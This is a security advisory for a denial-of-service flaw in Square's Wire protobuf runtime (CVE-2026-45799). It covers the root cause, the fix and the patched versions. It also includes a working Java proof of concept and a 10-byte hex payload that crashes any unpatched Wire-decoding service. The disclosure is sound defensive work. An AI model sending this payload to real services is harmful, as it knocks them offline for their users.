# [H] Wire: skipGroup() missing negative-length check allows 10-byte payload to crash any Wire-decoding service 

## Summary
Severity: High
Advisory: GHSA-7xpr-hc2w-34m9
CVE: CVE-2026-45799
CWE: CWE-129
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-7xpr-hc2w-34m9
Type: github-advisory

## Affected
- Maven: `com.squareup.wire:wire-runtime-jvm` — affected >=0 <6.3.0
- Maven: `com.squareup.wire:wire-runtime` — affected >=0 <6.3.0
- Maven: `com.squareup.wire:wire-runtime` — affected >=7.0.0-alpha01 <7.0.0-alpha03
- Maven: `com.squareup.wire:wire-runtime-jvm` — affected >=7.0.0-alpha01 <7.0.0-alpha03

## Details
# CVE-2026-45799

## Maintainer summary

Wire's protobuf group-skipping logic did not reject negative lengths before skipping a
length-delimited field inside a group. A crafted protobuf payload could cause Wire to throw an
unchecked runtime exception during decoding instead of the documented `IOException` /
`ProtocolException` failure path.

This can crash services that decode untrusted protobuf payloads and only handle Wire's documented
checked decoding failures.

## Affected artifacts

### `com.squareup.wire:wire-runtime`

Affected versions: vulnerable releases before `6.3.0`.

Patched versions: `6.3.0` and later.

Users should upgrade to `com.squareup.wire:wire-runtime:6.3.0` or later.

### `com.squareup.wire:wire-runtime-jvm`

Affected versions: vulnerable releases before `6.3.0`.

Patched versions: `6.3.0` and later.

Users should upgrade to `com.squareup.wire:wire-runtime:6.3.0` or later.

### Wire 7 alpha releases

The fix has been merged to `master` and will be included in the next Wire 7 alpha release. Until
that release is available, Wire 7 alpha users should avoid decoding untrusted protobuf payloads with
affected alpha versions or build from a commit containing the fix.

## Fix

The issue is fixed in Wire `6.3.0`.

The fix rejects negative lengths while skipping groups and throws `ProtocolException` instead of
allowing the reader to move to an invalid position and later throw an unchecked runtime exception.

## Credit

Reported by @TrekLaps.

## Technical details

The following technical details are based on the original report, updated by the maintainers to
reflect the assigned CVE, the supported fixed artifact, and the discontinued status of
`com.squareup.wire:wire-runtime-jvm`.

`ByteArrayProtoReader32.skipGroup()` in `wire-runtime` did not validate that a
`LENGTH_DELIMITED` field's length is non-negative before calling `skip()`. A crafted protobuf
varint encodes `-128` as a signed `Int`. When `skip(-128)` runs, the internal position counter
underflows to an invalid negative position. The next `readByte()` accesses the source with that
negative position, throwing `ArrayIndexOutOfBoundsException`, a `RuntimeException` that escapes
Wire's documented `IOException` boundary and can crash the request handler.

`ProtoAdapter.decode(byte[])` is declared to throw `IOException`. Callers following the documented
API may catch only `IOException`, so unchecked runtime exceptions from malformed input can escape
the expected error boundary.

The originally confirmed vulnerable legacy versions include `5.3.1` and `5.3.3` for the
discontinued `com.squareup.wire:wire-runtime-jvm` coordinate. The supported replacement coordinate
is `com.squareup.wire:wire-runtime`, fixed in version `6.3.0`.

## Root cause

In the originally reported vulnerable code path, `ByteArrayProtoReader32.skipGroup()` read the
length as a signed `Int` and used it without validating that it was non-negative:

```kotlin
STATE_LENGTH_DELIMITED -> {
  val length = internalReadVarint32() // returns signed Int and can be negative
  skip(length)                        // no negative check
}
```

The internal `skip()` implementation then accepted the negative count because the computed
position was not greater than the limit:

```kotlin
private fun skip(byteCount: Int) {
  val newPos = pos + byteCount        // for example, 7 + (-128) = -121
  if (newPos > limit) throw EOFException()
  pos = newPos                        // pos = -121
}
```

The next read could then index the source with the invalid negative position:

```kotlin
private fun readByte(): Byte {
  if (pos == limit) throw EOFException()
  return source[pos++]                // source[-121] throws ArrayIndexOutOfBoundsException
}
```

Wire already rejected negative lengths in normal length-delimited field decoding. The same
validation was missing from group-skipping code.

The fix adds this validation when skipping groups:

```kotlin
STATE_LENGTH_DELIMITED -> {
  val length = internalReadVarint32()
  if (length < 0) throw ProtocolException("Negative length: $length...")
  skip(length)
}
```

The fix was applied to both `ByteArrayProtoReader32.skipGroup()` and `ProtoReader.skipGroup()`.

## Reproduction

The following reproduction was provided for vulnerable legacy `wire-runtime-jvm` releases such as
`5.3.1` and `5.3.3`:

```bash
curl -sL https://repo1.maven.org/maven2/com/squareup/wire/wire-runtime-jvm/5.3.3/wire-runtime-jvm-5.3.3.jar -o wire.jar
curl -sL https://repo1.maven.org/maven2/com/squareup/okio/okio-jvm/3.9.1/okio-jvm-3.9.1.jar -o okio.jar
curl -sL https://repo1.maven.org/maven2/org/jetbrains/kotlin/kotlin-stdlib/2.1.0/kotlin-stdlib-2.1.0.jar -o stdlib.jar
```

```java
// WirePoc.java
import com.squareup.wire.AnyMessage;

public class WirePoc {
  public static void main(String[] args) throws Exception {
    byte[] payload = new byte[] {
      (byte) 0x9B, 0x06,                                          // field 99, START_GROUP
      0x0A,                                                       // field 1, LENGTH_DELIMITED
      (byte) 0x80, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, 0x0F,   // varint = -128
      (byte) 0x9C, 0x06                                           // field 99, END_GROUP
    };

    AnyMessage.ADAPTER.decode(payload);
  }
}
```

```bash
javac -cp "wire.jar:okio.jar:stdlib.jar" WirePoc.java
java -cp ".:wire.jar:okio.jar:stdlib.jar" WirePoc
```

Observed output on vulnerable versions:

```text
Exception in thread "main" java.lang.ArrayIndexOutOfBoundsException: Index -120 out of bounds for length 10
    at com.squareup.wire.ByteArrayProtoReader32.readByte(ByteArrayProtoReader32.kt:448)
    at com.squareup.wire.ByteArrayProtoReader32.internalReadVarint32(ByteArrayProtoReader32.kt:294)
    at com.squareup.wire.ByteArrayProtoReader32.skipGroup(ByteArrayProtoReader32.kt:209)
    at com.squareup.wire.ByteArrayProtoReader32.nextTag(ByteArrayProtoReader32.kt:156)
    at com.squareup.wire.AnyMessage$Companion$ADAPTER$1.decode(AnyMessage.kt:150)
    at com.squareup.wire.AnyMessage$Companion$ADAPTER$1.decode(AnyMessage.kt:88)
    at com.squareup.wire.ProtoAdapter.decode(ProtoAdapter.kt:468)
    at WirePoc.main(WirePoc.java:10)
```

With the fix, the same payload is rejected with `ProtocolException`.

## Why this can affect any Wire-decoding service

`skipGroup()` is called for any unknown field with wire type 3. An attacker can send an unknown
field, such as field 99, with wire type `START_GROUP`. The decoder skips it via `skipGroup()`
regardless of which message type the service uses, so no schema knowledge is required.

Payload:

```text
9b060a80ffffff0f9c06
```

Payload breakdown:

```text
0x9B 0x06                 field 99, wire type 3 (START_GROUP)
0x0A                      field 1, wire type 2 (LENGTH_DELIMITED) inside group
0x80 0xFF 0xFF 0xFF 0x0F  5-byte varint = -128 as signed Int
0x9C 0x06                 field 99, END_GROUP
```

## References
- https://github.com/square/wire/security/advisories/GHSA-7xpr-hc2w-34m9
- https://nvd.nist.gov/vuln/detail/CVE-2026-45799
- https://github.com/square/wire/pull/3595
- https://github.com/square/wire/pull/3597
- https://github.com/square/wire/commit/47d5b0dba53935d5332cd41a80a353b3fc90e7b0
- https://github.com/square/wire/commit/e4e56fab38a547d9625f05c97f1d8f0bcc3a5773
- https://github.com/square/wire
- https://github.com/square/wire/releases/tag/6.3.0
- https://github.com/square/wire/releases/tag/7.0.0-alpha03
